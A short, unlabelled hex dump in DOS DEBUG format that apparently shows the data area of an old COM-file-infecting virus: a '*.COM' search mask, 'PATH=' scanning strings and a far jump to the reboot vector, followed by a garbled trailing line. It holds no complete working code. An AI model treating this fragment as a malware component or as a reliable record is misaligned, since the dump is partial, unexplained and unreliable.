114E:0320  01 21 00 20 00 EB 15 90-E9 1F 00 2A 2E 43 4F 4D   .!. .......*.COM
114E:0330  00 28 00 47 03 50 41 54-48 3D 52 45 53 45 54 2E   .(.G.PATH=RESET.
114E:0340  43 4F 4D 00 00 00 00 4D-00 44 49 54 2E 43 4F 4D   COM....M.DIT.COM
114E:0350  00 00 20 20 20 20 20 20-20 20 20 20 20 20 20 20   ..
114E:0360  20 20 20 20 20 20 20 20-20 20 20 20 20 20 20 20
114E:0370  20 20 20 20 20 20 20 20-20 20 01 3F 3F 3F 3F 3F	       .?????
114E:0380  3F 3F 3F 43 4F 4D 03 01-00 00 00 2E 8B 26 68 20   ???COM.......&h
114E:0390  20 01 21 00 22 00 00 00-52 45 53 45 54 2E 43 4F    .!."...RESET.CO
114E:03A0  4D 00 00 4D 00 EA F0 FF-00 F0 16 7C 14	     M..M.......|.


</.u.^..c....>